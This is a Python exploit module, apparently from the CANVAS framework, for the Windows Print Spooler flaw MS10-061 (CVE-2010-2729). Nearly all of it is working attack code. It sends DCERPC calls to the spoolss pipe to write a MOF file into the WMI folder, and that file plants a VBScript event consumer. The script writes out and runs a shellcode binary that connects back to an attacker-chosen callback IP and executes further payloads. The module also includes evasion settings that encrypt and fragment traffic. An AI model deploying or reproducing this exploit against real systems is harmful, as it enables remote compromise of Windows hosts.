#!/usr/bin/env python
##ImmunityHeader v1 
###############################################################################
## File       :  ms10_061.py
## Description:  
##            :  
## Created_On :  Tue Sep 14 14:00:13 2010
## Created_By :  Kostya Kortchinsky
## Modified_On:  Thu Sep 16 13:30:17 2010
## Modified_By:  Kostya Kortchinsky
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
###############################################################################

import sys
import socket
import struct

if '.' not in sys.path: sys.path.append('.')

NAME='Microsoft Windows Print Spooler Arbitrary File Creation'
DESCRIPTION='Microsoft Windows Print Spooler Arbitrary File Creation'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['Date public']=''
DOCUMENTATION['References']="""http://blogs.technet.com/b/srd/archive/2010/09/14/ms10-061-printer-spooler-vulnerability.aspx
http://www.microsoft.com/technet/security/bulletin/ms10-061.mspx"""
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['CVE Name']='CVE-2010-2729'
DOCUMENTATION['CVE Url']='http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2729'
DOCUMENTATION['CVSS']=0.0
DOCUMENTATION['Note']='Please refer to the Microsoft URLs to know exactly the conditions for when this vulnerability is exploitable.'

VERSION='1.0'
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP','2003']
PROPERTY['MSADV']='MS10-061'

CHANGELOG="""
"""

NOTES="""
Usage:
./commandlineInterface.py -v 1 -p 5555
./exploits/ms10_061/ms10_061.py -t 192.168.2.115 -v 1 -U Guest -l 192.168.2.101 -d 5555
"""


TODO="""
Test on Windows 2000. Should work, but MOF namespace will need to be changed.

Test on Windows 2003/2008 - these will only work if drivers for older printers are installed.

Modify to make it a local - need to add a printer and then exploit locally using an API? I think
you can use a commandline tool to automatically add the printer...

"""
from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine
from engine import CanvasConfig
import shellcodeGenerator
from MOSDEF import pelib
import time
import libs.newsmb.libdcerpc as libdcerpc
from libs.newsmb.libdcerpc import s_dce_raw_unistring, s_dce_win2k_unistring

targets={
    0: ['Autoversioning',0],
    1: ['Windows ALL',0]
}

def read_raw_unicode_string(buf):
    i=0 #this makes it so that if we never find a 00 00 we use the whole buffer, basically
    for i in range(0,len(buf)/2):
        if buf[i*2]=="\x00" and buf[i*2+1]=="\x00":
            #termination of string
            break
    return buf[:i*2+2], i

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name             = NAME
        self.port             = 445
        self.version          = 0
        self.badstring        = '\0\xff'
        self.myDCE            = None
        self.connectionList   = []
        self.subesp           = 0
        self.covertness       = 0
        self.user             = ''
        self.password         = ''
        self.domain           = ''
        self.needsNoShellcode = 1

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def test(self):
        self.getArgs()
        if self.connect():
            return self.testOS()

        self.log('Test failed')
        return 0

    def testOS(self):
        if self.version!=0:
            self.log('TestOS running with version %d?!?' % self.version)

        self.version=0
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        if app.run()==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        myos=app.result
        self.log('OS Found: %s'%(myos))
        if myos.base!='Windows':
            self.log('Cannot attack non Windows with this exploit')
            return 0
        self.version=1
        return 1

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        if self.version==0: #we don't want result of testOS to be overwritten
            self.version=int(self.argsDict.get('version',self.version))
        self.user=self.argsDict.get('user',self.user)
        self.password=self.argsDict.get('password',self.password)
        self.domain = self.getarg('domain')
        #self.command=self.argsDict.get('command',self.command)
        return

    def generateMOF(self):
        sc=shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp', {'subespval':0})
        sc.addAttr('revert_to_self_before_importing_ws2_32', None)
        sc.addAttr('tcpconnect', {'port': self.callback.port, 
                                  'ipaddress':self.callback.ip})
        mosdef_type=self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
        mosdef_id=self.engine.getNewMosdefID(self)
        self.log("Creating MOSDEF ID: %d"%mosdef_id)
        sc.addAttr('send_universal',{'mosdef_type': mosdef_type,'mosdef_id':mosdef_id})
        sc.addAttr('RecvExecDepSafe',{'socketreg':'FDSPOT'})
        sc.addAttr('ExitProcess',None)
        sc.vAllocSelf=True
        callback_payload=sc.get()
        myPElib=pelib.PElib()
        binary=myPElib.createPEFileBuf(callback_payload)

        vbs=''
        for i in range(0,len(binary),8):
            vbs+='"binary = binary & \\"'
            for j in range(8):
                if (i+j)>=len(binary):
                    break
                vbs+='%02x'%(ord(binary[i+j]))
                if (i+j)!=len(binary)-1:
                    vbs+=','
            vbs+='\\"\\n"\n'
        vbs+='"tmp = Split(binary, \\",\\")\\n"\n'
        vbs+='"Set fso = CreateObject(\\"Scripting.FileSystemObject\\")\\n"\n'
        vbs+='"Set shell = CreateObject(\\"WScript.Shell\\")\\n"\n'
        vbs+='"userprofile = shell.ExpandEnvironmentStrings(\\"%USERPROFILE%\\")\\n"\n'
        vbs+='"path = userprofile & \\"\\\\\\" & \\"cb%d.exe\\"\\n"\n'%(random.randint(1,99))
        vbs+='"Set f = fso.CreateTextFile(path, True)\\n"\n'
        vbs+='"For i = 0 To UBound(tmp)\\n"\n'
        vbs+='"  b = Int(\\"&H\\" & tmp(i))\\n"\n'
        vbs+='"  f.Write Chr(b)\\n"\n'
        vbs+='"Next\\n"\n'
        vbs+='"f.Close\\n"\n'
        vbs+='"shell.Run Chr(34) & path & Chr(34), 7, false\\n"'

        mof="""#pragma namespace ("\\\\\\\\.\\\\root\\\\subscription")

#pragma deleteclass("MyASEventConsumer", nofail)
#pragma deleteinstance("__EventFilter.Name=\\\"EF\\\"", nofail)
#pragma deleteinstance("ActiveScriptEventConsumer.Name=\\\"ASEC\\\"", nofail)

class MyASEventConsumer
{
	[key]string Name;
};

instance of ActiveScriptEventConsumer as $CONSUMER
{
    CreatorSID = {1,2,0,0,0,0,0,5,32,0,0,0,32,2,0,0};
    Name = "ASEC";
    ScriptingEngine = "VBScript";    
    ScriptText =
SCRIPT;
};

instance of __EventFilter as $FILTER
{
    CreatorSID = {1,2,0,0,0,0,0,5,32,0,0,0,32,2,0,0};
    Name = "EF";
    Query = "SELECT * FROM __InstanceCreationEvent"
        " WHERE TargetInstance.__class = \\"MyASEventConsumer\\"";
    QueryLanguage = "WQL";
};

instance of __FilterToConsumerBinding as $BINDING
{
    CreatorSID = {1,2,0,0,0,0,0,5,32,0,0,0,32,2,0,0};
    Filter = $FILTER;
    Consumer = $CONSUMER;
};

instance of MyASEventConsumer
{
     Name = "Trigger";
};
""".replace('SCRIPT',vbs)
        #print mof
        return mof

    def connect(self):
        connectionList=self.buildConnectionList()
        res = None
        auth_type = libdcerpc.RPC_C_AUTHN_NONE if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_WINNT
        auth_level = libdcerpc.RPC_C_AUTHN_LEVEL_DEFAULT if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY
        
        if self.covertness >= 2:
            self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")

        frag_level = None
        if self.covertness >= 5 and self.covertness < 11:
            self.log('Crypto + moderate SMB fragmentation')
            frag_level = 1
        elif self.covertness == 11:
            self.log('Crypto + MAX fragmentation')
            frag_level = 2
        
        for binding in connectionList:
            try:
                self.myDCE = libdcerpc.DCERPC(binding, getsock=self, username=self.user, password=self.password,
                                              domain=self.domain, frag_level=frag_level)
                res = self.myDCE.bind(self.UUID, self.uuidversion, auth_type=auth_type, auth_level=auth_level)
                if res:
                    break
            except libdcerpc.DCERPCException, ex:
                self.log('DCERPC Error: %s' % ex)

        if not res:
            self.log('Could not connect to remote service')
            return 0
                
        self.log('Attacking target!')
        return 1
    
    def buildConnectionList(self):
        self.UUID='12345678-1234-abcd-ef00-0123456789ab'
        self.uuidversion='1.0'
        self.connectionList=['ncacn_np:%s[\\spoolss]'%(self.host)]
        return self.connectionList

    def parseEnumResponse(self,buf):
        success = struct.unpack('<L',buf[-4:])[0]
        unique = struct.unpack('<L',buf[:4])[0]
        data=''
        if unique!=0:
            size=struct.unpack('<L',buf[4:8])[0]
            data=buf[8:8+size]
        needed=struct.unpack('<L',buf[-12:-8])[0]
        returned=struct.unpack('<L',buf[-8:-4])[0]
        return (needed,returned,data)

    def EnumPrintersW(self):
        self.log('Enumerating Printers')
        names=[]
        packet=''
        packet+=struct.pack('<L',6)
        packet+=struct.pack('<L',0)
        packet+=struct.pack('<L',1)
        packet+=struct.pack('<L',0)
        packet+=struct.pack('<L',0)

        self.myDCE.call(0x0, packet, response=True)
        ret = self.myDCE.reassembled_data

        #print ret.encode('hex')
        if not ret:
            return names
        needed,returned,data=self.parseEnumResponse(ret)
        if needed==0:
            return names
        packet=''
        packet+=struct.pack('<L',6)
        packet+=struct.pack('<L',0)
        packet+=struct.pack('<L',1)
        packet+=struct.pack('<L',1) #[]
        packet+=struct.pack('<L',needed)
        packet+='\0'*(((needed+3)>>2)<<2)
        packet+=struct.pack('<L',needed)
        self.myDCE.call(0x0, packet, response=True)
        ret = self.myDCE.reassembled_data
        #print ret.encode('hex')
        if not ret:
            return names
        needed,returned,data=self.parseEnumResponse(ret)
        headerdata=data[:16*returned]
        bodydata=data[16*returned:]
        for i in range(0,returned):
            off=len(headerdata)
            flags,desc_off,name_off,comm_off=struct.unpack('<LLLL',headerdata[0:16])
            headerdata=headerdata[16:]
            desc,_=read_raw_unicode_string(bodydata[desc_off-off:])
            name,_=read_raw_unicode_string(bodydata[name_off-off:])
            comm,_=read_raw_unicode_string(bodydata[comm_off-off:])
            names+=[name]
        return names

    def OpenPrinterW(self,printer):
        self.log('Trying to open Printer "%s"'%(printer.decode("utf-16-le","ignore").replace("\x00","")))
        packet=''
        packet+=struct.pack('<L',1)
        packet+=s_dce_raw_unistring(printer)
        packet+=struct.pack('<L',0)
        packet+=struct.pack('<L',0)
        packet+=struct.pack('<L',0)
        packet+=struct.pack('<L',0)
        self.myDCE.call(0x1, packet, response=True)
        ret = self.myDCE.reassembled_data
        if not ret:
            return ''
        status=struct.unpack('<L',ret[-4:])[0]
        if status!=0:
            return ''
        return ret[:20]

    def StartDocPrinterW(self,handle,filename):
        self.log('Starting doc printing ("%s")'%(filename))
        packet=''
        packet+=handle
        packet+=struct.pack('<LL',1,1) #Level,Level
        packet+=struct.pack('<L',1) #
        packet+=struct.pack('<LLL',2,3,4) #
        packet+=s_dce_win2k_unistring('Doc%04x'%(random.randint(1,65535)))
        packet+=s_dce_win2k_unistring(filename)
        packet+=s_dce_win2k_unistring('RAW')
        self.myDCE.call(0x11, packet, response=True)
        ret = self.myDCE.reassembled_data
        if not ret or len(ret)!=8:
            return 0,-1
        jobid,status=struct.unpack('<LL',ret)
        return jobid,status

    def RpcWritePrinter(self,handle,data):
        self.log('Writing to printer')
        packet=''
        packet+=handle
        packet+=struct.pack('<L',len(data))
        packet+=data
        while len(packet)%4!=0:
            packet+='\0'
        packet+=struct.pack('<L',len(data))
        self.myDCE.call(0x13, packet, response=True)
        ret = self.myDCE.reassembled_data
        if not ret or len(ret)!=8:
            return 0,-1
        written,status=struct.unpack('<LL',ret)
        return written,status

    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s:%d - (in progress)'%(self.name,self.host,self.port),showlog=True)

        self.setProgress(20)
        self.log('Connecting using username: %s and password: %s, domain: %s' % (self.user,self.password, self.domain))
        if self.connect()==0:
            return 0
        if self.version==0:
            self.log('Testing for OS')
            if not self.testOS() or self.version==0:
                self.log('OS detection failed.')
                return 0
        self.info,self.eip=targets[self.version]
        self.setProgress(40)
        printers=self.EnumPrintersW()
        if len(printers)==0:
            self.log('No available Printers!')
            return 0
        self.setProgress(60)
        for p in printers:
            h=self.OpenPrinterW(p)
            if h=='':
                self.log('Opening Printer %s failed!'%(p))
                continue
            self.log('Handle to Printer "%s": %s'%(p.decode("utf-16-le","ignore").replace("\x00",""),h.encode('hex')))
            jobid,status=self.StartDocPrinterW(h,'wbem\\mof\\script%d.mof'%(random.randint(1,99)))
            self.log('StartDocPrinterW returned 0x%08x (%d)'%(status,jobid))
            if status==5:
                self.log('Access denied. You do not have the necessary privileges to exploit this vulnerability!')
            if status!=0:
                continue
            data=self.generateMOF()
            written,status=self.RpcWritePrinter(h,data)
            self.log('RpcWritePrinter returned 0x%08x (%d)'%(status,written))
        #self.myDCE.close()
        self.setProgress(100)

        sleeptime = 30
        self.log('Sleeping for %ds'%sleeptime)
        for i in xrange(0,sleeptime,2):
            if self.state == self.HALT: 
                self.log("Halted.")
                break 
            self.log("Slept: %d"%i)
            if self.ISucceeded():
                self.log("We succeeded!")
                break 
            time.sleep(2)

        if self.ISucceeded():
            self.setInfo('%s attacking %s:%d (succeeded!)'%(self.name,self.host,self.port),showlog=True)
            self.log('%s done (succeeded!)'%(self.name))
            return 1
        self.setInfo('%s attacking %s:%d (failed)'%(self.name,self.host,self.port),showlog=True)
        self.log('%s done (failed)'%(self.name))
        return 0

    
if __name__=='__main__':
    print 'Running CANVAS %s Exploit v%s'%(DESCRIPTION,VERSION)
    app=theexploit()
    try:
        ret=standard_callback_commandline(app)
    except KeyboardInterrupt:
        pass
    if ret not in [0,1,None] and hasattr(ret,'interact'):
        ret.interact()
